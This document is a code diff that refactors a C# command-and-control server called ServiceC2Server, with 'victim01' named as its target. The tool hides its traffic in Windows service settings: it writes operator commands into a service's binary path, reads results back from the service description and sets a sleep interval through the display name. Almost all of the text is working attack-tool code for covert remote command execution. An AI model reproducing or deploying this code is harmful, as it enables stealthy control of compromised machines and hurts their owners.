@@ -17,10 +17,6 @@ namespace ServiceC2Server
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);
 
-        [DllImport("advapi32", SetLastError = true)]
-        [return: MarshalAs(UnmanagedType.Bool)]
-        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);
-
         [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);
@@ -73,62 +69,7 @@ namespace ServiceC2Server
         }
 
 
-        public static IntPtr Connect(string serviceName)
-        {
-            IntPtr SCMHandle = OpenSCManager(null, null, 0xF003F);
-            if (SCMHandle == IntPtr.Zero)
-            {
-                Console.WriteLine("\t[-] Failed to get SCM handle: ");
-                return IntPtr.Zero;
-
-            }
-            Console.WriteLine("\t[+] OpenSCManager [OK]");
-
-            IntPtr schService = OpenService(SCMHandle, serviceName, 0xF01FF);
-            if (schService == IntPtr.Zero)
-            {
-                Console.WriteLine("\t[-] Failed to connect to service... Trying to create new service...");
-                schService = CreateService(SCMHandle, serviceName);
-   
-            }
-            Console.WriteLine("\t[+] OpenService [OK]");
-
-            return schService;
-        }
-
-        public static IntPtr CreateService(IntPtr SCMHandle, string serviceName)
-        {
-            Console.WriteLine("\t[*] Trying to Create a new service called: " + serviceName);
-            IntPtr schService = CreateServiceA(SCMHandle,  serviceName, "30", 0xF003F, 0x00000010, 0x00000004, 0x00000000, "whoami", null, null, null, null, null);
-            if (schService == IntPtr.Zero)
-            {
-                Console.WriteLine("\t[-] Failed to create service... Could be a duplicate issue?");
-                Console.WriteLine(GetLastError());
-                Environment.Exit(1);
-            }
-            return schService;
-        }
-
-        public static void Shutdown(string serviceName, bool ctrlc)
-        {
-            Console.WriteLine("[+] Closing down...");
-            IntPtr schService = Connect(serviceName);
-            DeleteService(schService);
-
-            //
-            //
-            if (!ctrlc)
-            {
-                Environment.Exit(0);
-            }
-        }
-
-        public static void Setup(string serviceName)
-        {
-            IntPtr schService = Connect(serviceName);
-        }
-
-        public static void UpdateSleep(string serviceName, string input)
+        public static void UpdateSleep(ServiceC2 server, string input)
         {
             string sleepTime = input.Split(' ')[1];
             int i = 0;
@@ -139,24 +80,25 @@ namespace ServiceC2Server
                 Console.WriteLine("[!] Please provide an integer when using the sleep command");
                 return;
             }
-            IntPtr schService = Connect(serviceName);
+
+            IntPtr schService = server.SchService;
 
             bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, null, null, null, null, null, null, sleepTime);
             if (!success)
             {
-                Console.WriteLine("\t[-] Failed to update sleep timer...");
+                Console.WriteLine("[-] Failed to update sleep timer...");
 
             }
             Console.WriteLine("[+] Sleep updated to: {0}", sleepTime);
 
         }
 
-        public static string ReadOutput(string serviceName)
+        public static string ReadOutput(ServiceC2 server)
         {
-            Console.WriteLine("Waiting for output from " + serviceName);
-            string output = "Error";
-            
-            IntPtr schService = Connect(serviceName);
+            //Console.WriteLine("Waiting for output from " + serviceName);
+            string output = "";
+
+            IntPtr schService = server.SchService;
 
             IntPtr buffer = IntPtr.Zero;
             uint dwBytesNeeded = 0;
@@ -164,55 +106,67 @@ namespace ServiceC2Server
             bool result = QueryServiceConfig2A(schService, 1, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
             IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
             result = QueryServiceConfig2A(schService, 1, ptr, dwBytesNeeded, out dwBytesNeeded);
-            
+            //Console.WriteLine(dwBytesNeeded);
 
+            if (dwBytesNeeded <= 4)
+            {
+                //Console.WriteLine("Output is empty");
+                return output;
+            }
 
             if (result)
             {
                 SERVICE_DESCRIPTION service_description = new SERVICE_DESCRIPTION();
-                Console.WriteLine(ptr.ToString());
 
-                Marshal.PtrToStructure(ptr, service_description);
+                try
+                {
+                    service_description = (SERVICE_DESCRIPTION)Marshal.PtrToStructure(ptr, new SERVICE_DESCRIPTION().GetType());
 
-                output = service_description.lpDescription;
-                Console.WriteLine("Output: " + output);
+                    output = service_description.lpDescription;
+                    //Console.WriteLine("Output: " + output);
+                } catch (Exception ex)
+                {
+                    //Console.WriteLine("Error getting output" + ex.Message);
+                }
+
             }
             
             Marshal.FreeHGlobal(ptr); 
             return output;
         }
 
-        public static void UpdateCommand(string serviceName, string input)
+        public static void UpdateCommand(ServiceC2 server, string input)
         {
             string newCmd = input.Substring(input.IndexOf(' ')).Remove(0,1);
 
-            IntPtr schService = Connect(serviceName);
+            IntPtr schService = server.SchService;
 
             bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, newCmd, null, null, null, null, null, null);
             if (!success)
             {
-                Console.WriteLine("\t[-] Failed to Change");
+                Console.WriteLine("[-] Failed to Change");
 
             }
-            Console.WriteLine("\t[+] ChangeServiceConfigA [OK]");
+            Console.WriteLine("[+] ChangeServiceConfigA [OK]");
 
             Console.WriteLine("[+] Cmd updated to: {0}", newCmd);
             
             while (true)
             {
-                string output = ReadOutput(serviceName); 
+                string output = ReadOutput(server); 
                 if (output.Length > 0)
                 {
                     Console.WriteLine("Got output: " + output);
+                    PostOutput(server, "");
                     break;
                 }
             }
         }
 
-        public static bool PostOutput(string host, string serviceName, string output)
+        public static bool PostOutput(ServiceC2 server, string output)
         {
 
-            IntPtr schService = Connect(serviceName);
+            IntPtr schService = server.SchService;
 
             SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();
 
@@ -247,22 +201,24 @@ namespace ServiceC2Server
                 Console.WriteLine("ServiceC2Server.exe victim01");
                 Environment.Exit(0);
             }
+           
+
+            //Setup all the requirements for the C2 server to work...
             string serviceName = "ServiceC2" + args[0];
+            ServiceC2 server = new ServiceC2(serviceName);
+            IntPtr schService = server.Connect();
 
             //Catching Ctrl + C events to clean up correctly...
             Console.CancelKeyPress += delegate
             {
-                Shutdown(serviceName, true);
+                server.Shutdown(true);
             };
-
-            //Setup all the requirements for the C2 server to work...
-            Setup(serviceName);
 
             //C2 Loop
             Console.WriteLine("[+] Ready...");
             while (true)
             {
-                Console.WriteLine(">");
+                Console.Write(">");
                 string input = Console.ReadLine();
                 if (input == "h" || input == "help")
                 {
@@ -271,17 +227,17 @@ namespace ServiceC2Server
 
                 if (input.StartsWith("sleep", StringComparison.OrdinalIgnoreCase))
                 {
-                    UpdateSleep(serviceName, input);
+                    UpdateSleep(server, input);
                 }
 
                 if (input.StartsWith("cmd", StringComparison.OrdinalIgnoreCase))
                 {
-                    UpdateCommand(serviceName, input);
+                    UpdateCommand(server, input);
                 }
 
                 if (input.StartsWith("exit", StringComparison.OrdinalIgnoreCase))
                 {
-                    Shutdown(serviceName, false);
+                    server.Shutdown(false);
                 }
             }
         }
